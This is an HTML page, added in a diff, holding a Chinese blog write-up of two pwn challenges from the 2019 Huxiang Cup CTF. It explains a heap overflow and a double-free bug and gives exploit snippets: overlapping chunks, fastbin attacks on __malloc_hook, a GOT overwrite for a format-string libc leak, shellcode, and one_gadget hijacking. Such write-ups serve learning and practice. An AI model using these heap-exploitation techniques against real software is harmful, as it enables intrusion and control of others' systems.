@@ -1,0 +1,324 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
+<meta name="author" content="treebacker">
+<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="../../../../images/favicon.png">
+
+
+<title>hxb2019-pwn题解 - Watch Security</title>
+
+<meta name="keywords" content="Reverse, Security, New">
+
+<meta name="description " content="湖湘杯2019">
+
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="Tree">Tree</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
+        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
+        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">Treebacker</h1>
+        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
+        <p class="cover-siteDesc">岁月易逝，痕影难觅</p>
+        <div class="cover-sns">
+            
+            <div class="btn btn-github">
+                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
+                    <i class="fa fa-github"></i>
+                </a>
+            </div>
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="active">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/essays" data-name="随笔">随笔</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/others" data-name="其他">其他</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">请输入关键字</label>
+        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
+        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(无标题)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '../../../../content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar">
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="" target="_blank">Treebacker</a>
+                    <span title="最后编辑于2019-11-10">2019-11-10</span>
+                </p>
+                <p></p>
+            </div>
+            <h2 class="post-title">HXB2019-pwn题解</h2>
+            <div class="post-meta">
+                本文总共3012个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h3 id="HXB2019-pwn题解"><a href="#HXB2019-pwn题解" class="headerlink" title="HXB2019-pwn题解"></a>HXB2019-pwn题解</h3><h4 id="HackNote"><a href="#HackNote" class="headerlink" title="HackNote"></a>HackNote</h4><ul>
+<li><p>程序分析</p>
+<ul>
+<li><p>这题秀在没有动态加载libc，而是把libc源码编译了进去，再去掉了符号信息。（调试起来很不方便）</p>
+</li>
+<li><p>漏洞点在edit功能，edit之后会strlen重新赋值size，那么由于内存地址可能的内容的连续，造成溢出。</p>
+<p>{! asset_img  2.png []}</p>
+</li>
+<li><p>这里吐槽以下，比赛的时候改文件。原本的存储chunk指针的数组是在bss的，后来改到了stack上。。。</p>
+</li>
+<li><p>不可以unlink了，只好想办法利用overlapping，而且由于程序基本没有保护，stack和heap都可以执行。应该是用到shellcode。</p>
+</li>
+</ul>
+</li>
+<li><p>漏洞利用</p>
+<ul>
+<li><p>堆溢出构造overlapping。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'0'</span>*<span class="number">0x18</span>)               <span class="comment">#size ture larger</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'1'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'2'</span>*<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'3'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'4'</span>*<span class="number">0x18</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#fake size overlapping</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'0'</span>*<span class="number">0x18</span> + <span class="string">'\x81'</span> + <span class="string">'\n'</span>) </span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>下面再得到大堆块，就可以修改fd，造成任意地址得到chunk。但是有个问题，就是这里的字节错位怎么找，一般都是在libc里找__malloc_hook前找0x7f，但是这个编译进malloc.c的程序怎么找malloc_hook呢，答案是对比源码找。。</p>
+<p>{! asset_img  4.png []}</p>
+<p>{! asset_img 5.png []}</p>
+<p>没错就是0x6cb788这里。</p>
+<p>我们看看有没有合适的size。</p>
+<p>{! asset_img 3.png []}</p>
+<p>这里，有个位置0x40，似乎可以，但其实返回给我们的是0x6cb78a高于__malloc_hook两个字节；</p>
+<p>还有一个位置，size的低4bytes是0x40，合不合适呢？是可以的，在libc里对size的检查是只检查低4bytes的（第二题也会用到）。所以可以用字节错位得到chunk。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span><span class="number">-8</span>,<span class="string">'A'</span>*<span class="number">0x18</span>+p64(<span class="number">0x41</span>)+p64(__malloc_hook - <span class="number">0x10</span>  - <span class="number">6</span>)+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>怎么写进去呢，通常用onegadget写在这里，但这里我们没法找onegadget，但是我们可以写shellcode（heap可以执行），所以直接将shellcode写在malloc_hook后面，而malloc_hook写上malloc_hook+8（shellcode的地址）就OK。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'aaaaaa'</span> + p64(__malloc_hook + <span class="number">8</span>) + shellcode + <span class="string">"\n"</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="NameSystem"><a href="#NameSystem" class="headerlink" title="NameSystem"></a>NameSystem</h4><ul>
+<li><p>程序分析</p>
+<ul>
+<li><p>漏洞点在将ptr指针前移的时候最后一个ptr[19]不会改变，可以double free。</p>
+<p>{! asset_img  7.png []}</p>
+</li>
+<li><p>add的时候有’\x00’截断。</p>
+<p>{! asset_img  6.png []}</p>
+</li>
+</ul>
+</li>
+<li><p>漏洞利用</p>
+<ul>
+<li><p>思路</p>
+<ul>
+<li>有了double free，就可以spirit了，这里由于不能show，需要想办法leak。由于size和’\x00’截断的缘故，没法unsorted bin弄出来。只好想法修改got。在got表上分配一个chunk。</li>
+<li>我原来的思路是，修改_free_got为puts_plt，然后再得到heap数组的chunk，修改堆指针为一个libc函数的got，free的时候泄露出来（类似于unlink的效果）。但是苦于没有edit功能，没法往heap数组写。</li>
+<li>后来参考师傅的，才想起可以用printf强制格式化字符串泄露在stack上的libc地址。</li>
+<li>有了libc地址就可以继续spirit到__malloc_hook，用onegadget打。好了开始吧。</li>
+</ul>
+</li>
+<li><p>首先，构造两个double chain。（只需要调整17、18、19三个chunk的size就可以了）一个用于got，一个用于__malloc_hook。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">[add(<span class="number">0x40</span>, <span class="string">'a'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>)]		<span class="comment">#padding 0-16</span></span><br><span class="line">    </span><br><span class="line">[add(<span class="number">0x50</span>, <span class="string">'b'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>)]		<span class="comment">#frist 17-19</span></span><br><span class="line">    </span><br><span class="line">free(<span class="number">17</span>)											</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line">free(<span class="number">17</span>)</span><br><span class="line">free(<span class="number">17</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'padding'</span>)			<span class="comment">#17</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'padding'</span>)			<span class="comment">#18</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'padding'</span>)			<span class="comment">#at 19</span></span><br><span class="line">    </span><br><span class="line">free(<span class="number">17</span>)						<span class="comment">#18 same as 19</span></span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line">free(<span class="number">17</span>)</span><br><span class="line">free(<span class="number">17</span>)</span><br><span class="line">    </span><br><span class="line">[free(<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]	<span class="comment">#add count -= 10</span></span><br><span class="line">   <span class="comment">#now we have two double chains, 0x60 &amp; 0x70</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>spirit到got，修改free_got和puts_got为printf_plt。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="comment">#frist try to get got</span></span><br><span class="line">add(<span class="number">0x50</span>, p64(<span class="number">0x601ffa</span>))		<span class="comment">#这个位置也是利用size只检查低4bytes</span></span><br><span class="line">add(<span class="number">0x50</span>, p64(<span class="number">0x601ffa</span>))</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">'aaa'</span>)</span><br><span class="line">gdb.attach(p, <span class="string">'b* 0x400BCB'</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">'a'</span>*<span class="number">0xe</span> + p64(<span class="number">0x4006d0</span>) + p64(<span class="number">0x4006d0</span>))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这里看一下栈上的情况，确定如何布置格式化字符串。断在free的位置。</p>
+<p>{! asset_img  8.png []}</p>
+<p>可以看到libc_start_main。说明我们是可以泄露的只需要调整格式话字符串就OK了。（我这里是%13$p)</p>
+</li>
+<li><p>拿到libc后，就是覆盖__malloc_hook，由于环境的原因，直接用gadget覆盖不行，可以用gadget覆盖realloc_hook，再用libc_realloc+offset覆盖malloc_hook。这里的offset根据onegadget的不同，取值不一；(0xf02a4的是0xd， 0xf1147的是0x14)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   	<span class="comment">#second get __malloc_hook</span></span><br><span class="line">   	add_(<span class="number">0x60</span>, p64(__malloc_hook<span class="number">-0x23</span>))		<span class="comment">#which is offset = 0xe from &amp;stdout</span></span><br><span class="line">add_(<span class="number">0x60</span>, <span class="string">'padding'</span>)</span><br><span class="line">   	add_(<span class="number">0x60</span>, <span class="string">'padding'</span>)</span><br><span class="line">   	add_(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">0xb</span> + p64(gadget) + p64(__libc_realloc+<span class="number">0x14</span>))</span><br><span class="line">   	add_(<span class="number">0x60</span>, <span class="string">'shell'</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>参考</p>
+<ul>
+<li>感谢<a href="https://leeeddin.github.io/" target="_blank" rel="noopener">le3d1ng师傅</a></li>
+</ul>
+</li>
+</ul>
+
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
+            </a>
+        </div>
+        
+        <div class="post-tags">标签：
+            
+            <a href="../../../../tags/pwn/">pwn</a>
+            
+        </div>
+        
+    </article>
+    
+    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
+    
+    
+</div>
+<script src="../../../../js/busuanzi.pure.mini.js"></script>
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/app" title="App下载">App下载</a>
+        </p>
+        <p>
+            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
+            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
+            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
+            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
+            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+
+    </div>
+</footer>
+<script src="../../../../js/InsightSearch.js"></script>
+<script src="../../../../js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '11/22/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+        });
+    });
+</script>
+</body>
+</html>
